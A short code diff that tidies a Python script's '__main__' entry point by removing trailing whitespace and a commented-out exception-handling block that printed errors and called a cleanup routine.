 if __name__ == "__main__":
-    main()    
-    
-    # except Exception as e:
-    #     print(e)
-    #     try: cleanup()
-    #     except: sys.exit() 
+    main()
